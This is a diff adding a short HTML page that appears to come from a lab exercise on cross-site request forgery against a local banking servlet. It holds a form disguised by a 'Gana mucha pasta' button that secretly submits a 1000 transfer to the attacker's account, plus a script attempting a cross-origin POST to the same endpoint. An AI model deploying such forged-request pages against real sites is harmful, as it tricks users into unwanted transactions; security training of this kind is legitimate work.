@@ -1,0 +1,22 @@
+<form name="formulario" action="http://localhost:8080/Ej10_CSRF/seguro/SVTransferencias" method="post">									
+
+	<p align="center">
+		<input type="submit" value="Gana mucha pasta"/>
+	</p>
+
+	<input type="hidden" name="accion" value="transferencia"/>
+	<input type="hidden" name="cuenta" value="mi cuenta"/>
+	<input type="hidden" name="cantidad" value="1000"/>
+	<input type="hidden" name="codigoValidacion" value="XR-71"/>
+	<input type="hidden" name="CSRFToken" value="???"/>
+
+</form>
+
+<!-- CORS -->
+<script type="application/javascript">
+	console.log("HOLA")
+	
+	let xmlHttp = new XMLHttpRequest();
+	xmlHttp.open("post","http://127.0.0.1:8080/Ej10_CSRF/seguro/SVTransferencias", false)
+	xmlHttp.send()
+</script>
